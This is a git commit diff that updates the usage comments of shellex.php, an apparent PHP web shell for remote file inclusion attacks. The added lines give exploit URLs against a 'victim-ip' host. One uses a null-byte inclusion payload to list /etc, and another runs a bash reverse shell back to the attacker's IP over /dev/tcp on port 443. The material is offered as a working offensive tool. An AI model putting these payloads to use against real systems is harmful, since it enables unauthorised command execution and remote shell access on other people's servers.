42cdb2cf6fb65200b8473b8eaeed2339cbf83745
Will Chatham <will@willchatham.com>
2017-10-02 10:54:43 -0400

    Update shellex.php
    Added info about reverse shell support.

--- shellex.php
+++ shellex.php
@@ -5,7 +5,13 @@
  is useful when other common PHP execution functions are blocked for
  whatever reason.
 
- Usage: https://victim-ip/section.php?page=http://your-ip/shellex.php%00&e=ls -al /etc
+ Usage: https://victim-ip/index.php?page=http://your-ip/shellex.php%00&e=ls -al /etc
+
+ Supports Reverse Shells too:
+ http://victim-ip/index.php?page=http://your-ip/shellex.php%00&e=/bin/bash -c 'bash -i >& /dev/tcp/your-ip/443 0 >&1'
+
+ **URL endoding may be needed for certain characters. YMMV.**
+
 
 	By Will Chatham. @willc on most things.
 
